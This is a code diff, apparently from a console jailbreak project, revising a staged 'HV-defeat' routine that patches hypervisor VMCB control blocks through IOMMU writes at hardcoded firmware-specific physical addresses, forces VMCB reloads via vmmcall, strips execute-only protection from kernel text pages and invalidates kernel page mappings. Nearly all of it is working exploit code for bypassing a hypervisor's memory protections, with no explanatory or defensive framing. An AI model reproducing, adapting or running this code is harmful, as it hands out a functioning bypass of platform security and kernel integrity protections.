@@ -7,27 +7,20 @@
 #include <fcntl.h>
 #include <setjmp.h>
 #include <signal.h>
-#include <stddef.h>
 #include <stdio.h>
-#include <unistd.h>
 
 uint64_t vmcb_pa[16];
 
 int hv_defeat_0304(void) {
-  if (gpu_init())
-    return -1;
   if (stage1_tmr_relax())
     return -1;
-  if (stage2_find_vmcbs())
+  if (stage2_patch_vmcbs())
     return -1;
-  iommu_selftest();
-  if (stage3_patch_vmcbs())
+  if (stage3_force_vmcb_reload())
     return -1;
-  if (stage4_force_vmcb_reload())
+  if (stage4_remove_xotext())
     return -1;
-  if (stage5_remove_xotext())
-    return -1;
-  if (stage6_kernel_pmap_invalidate_all())
+  if (stage5_kernel_pmap_invalidate_all())
     return -1;
   return 0;
 }
@@ -77,78 +70,33 @@ no_ok:
   return -1;
 }
 
-int stage2_find_vmcbs(void) {
-  DEBUG_PRINT("\nHV-defeat [stage2] vmcb discovery\n");
-
-  for (int c = 0; c < 16; c++) {
-    vmcb_pa[c] = get_vmcb(c);
-    DEBUG_PRINT("  core %02d: pa=0x%016lx\n", c, vmcb_pa[c]);
-  }
-
-  return 0;
-}
-
-uint64_t get_vmcb(int core) {
+static uint64_t get_vmcb(int core) {
   switch (fw) {
   case 0x0300:
   case 0x0310:
   case 0x0320:
   case 0x0321:
     return (uint64_t)0x6290B000 + (uint64_t)core * 0x3000;
-    break;
   case 0x0400:
   case 0x0402:
   case 0x0403:
   case 0x0450:
   case 0x0451:
     return (uint64_t)0x62A05000 + (uint64_t)core * 0x3000;
-    break;
   default:
     return -1;
   }
 }
 
-int iommu_selftest(void) {
-  DEBUG_PRINT("\n[iommu] self-test\n");
-
-  uint64_t scratch = 0xAAAAAAAABBBBBBBBULL;
-  uint64_t scratch_pa = vtophys_user((uint64_t)&scratch);
-
-  if (!scratch_pa || scratch_pa >= 0x100000000ULL) {
-    DEBUG_PRINT("  bad scratch PA 0x%016lx\n", scratch_pa);
-    return -1;
-  }
-
-  uint64_t pattern = 0xDEADCAFE12345678ULL;
-  DEBUG_PRINT("  scratch pa=0x%016lx before=0x%016lx\n", scratch_pa, scratch);
-
-  iommu_write8_pa(scratch_pa, pattern);
-  uint64_t readback = kread64(dmap + scratch_pa);
-
-  DEBUG_PRINT("  wrote=0x%016lx read=0x%016lx %s\n", pattern, readback,
-              (readback == pattern) ? "OK" : "FAIL");
-
-  return (readback == pattern) ? 0 : -1;
-}
-
-int stage3_patch_vmcbs(void) {
-  DEBUG_PRINT("\nHV-defeat [stage3-iommu] vmcb patch via IOMMU\n");
+int stage2_patch_vmcbs(void) {
+  DEBUG_PRINT("\nHV-defeat [stage2-iommu] vmcb patch via IOMMU\n");
 
   int cur = sceKernelGetCurrentCpu();
   pin_to_core(cur);
 
   for (int i = 0; i < 16; i++) {
-    uint64_t pa = vmcb_pa[i];
-
-    iommu_write8_pa(pa + 0x00, 0x0000000000000000ULL);
-    iommu_write8_pa(pa + 0x08, 0x0004000000000000ULL);
-    iommu_write8_pa(pa + 0x10, 0x000000000000000FULL);
-    iommu_write8_pa(pa + 0x58, 0x0000000000000001ULL);
-    iommu_write8_pa(pa + 0x90, 0x0000000000000000ULL);
-
-    DEBUG_PRINT("  vmcb[%2d] patched (pa=0x%016lx)\n", i, pa);
-
-    usleep(1000);
+    vmcb_pa[i] = get_vmcb(i);
+    iommu_write8_pa(vmcb_pa[i] + 0x90, 0);
   }
 
   pin_to_core(9);
@@ -165,7 +113,7 @@ void handle_sigill(int sig) {
   longjmp(jmp_env, 1);
 }
 
-int stage4_force_vmcb_reload(void) {
+int stage3_force_vmcb_reload(void) {
   int ret = 0;
 
   auto old_handler = signal(SIGILL, handle_sigill);
@@ -178,7 +126,6 @@ int stage4_force_vmcb_reload(void) {
       __asm__ volatile("vmmcall");
     }
 
-    usleep(1000);
     DEBUG_PRINT("[vmmcall] core: %02d %s\n", i,
                 vmmcall_faulted ? "SIGILL (caught)" : "ok");
 
@@ -192,8 +139,8 @@ int stage4_force_vmcb_reload(void) {
   return ret ? 0 : -1;
 }
 
-int stage5_remove_xotext(void) {
-  DEBUG_PRINT("\nHV-Defeat [stage5] xotext removal\n");
+int stage4_remove_xotext(void) {
+  DEBUG_PRINT("\nHV-Defeat [stage4] xotext removal\n");
 
   uint64_t start = ktext;
   uint64_t end = kdata;
@@ -204,20 +151,11 @@ int stage5_remove_xotext(void) {
     n++;
   }
   DEBUG_PRINT("  %d pages on ktext\n", n);
-
-  start = kdata;
-  end = kdata + 0x08000000;
-  n = 0;
-  for (uint64_t a = start; a < end; a += 0x1000) {
-    page_chain_set_rw(a);
-    n++;
-  }
-  DEBUG_PRINT("  %d pages on kdata\n", n);
   return 0;
 }
 
-int stage6_kernel_pmap_invalidate_all(void) {
-  DEBUG_PRINT("HV-Defeat [stage6] invalidate paging entries\n");
+int stage5_kernel_pmap_invalidate_all(void) {
+  DEBUG_PRINT("HV-Defeat [stage5] invalidate paging entries\n");
 
   static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};
 
